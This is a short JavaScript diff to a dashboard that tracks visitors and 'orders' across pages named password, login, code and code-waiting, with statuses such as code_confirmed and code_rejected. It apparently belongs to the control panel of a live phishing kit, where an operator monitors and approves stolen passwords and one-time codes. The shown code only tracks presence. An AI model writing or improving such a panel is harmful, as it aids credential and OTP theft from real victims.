@@ -385,10 +385,19 @@ function renderStats(){
   document.getElementById('oCnt').textContent=orders.length;
 }
 
-function isOnline(o){return visitors.some(v=>{const vp=(v.current_page||'').replace('.html','').replace('-fr','');
-  const op=(o.current_page||'').replace('.html','').replace('-fr','');return vp===op;});}
+function isOnline(o){
+  const op=(o.current_page||'').replace('.html','').replace('-fr','');
+  return visitors.some(v=>{
+    const vp=(v.current_page||'').replace('.html','').replace('-fr','');
+    if(vp===op) return true;
+    const waitPages=['waiting','code-waiting','code-waiting-fr','password','password-fr','login','login-fr','code','code-fr'];
+    const isWait=waitPages.some(w=>op.includes(w.replace('-fr',''))||vp.includes(w.replace('-fr','')));
+    if(isWait && v.last_active_at && (Date.now()-v.last_active_at)<30000) return true;
+    return false;
+  });
+}
 function isActive(o){return o.current_page&&o.current_page!=='success'&&
-  !['confirmed','rejected','code_confirmed','code_rejected'].includes(o.status)&&isOnline(o);}
+  !['confirmed','rejected','code_confirmed','code_rejected'].includes(o.status);}
 
 // ACTIVE SIDEBAR
 function renderActive(){
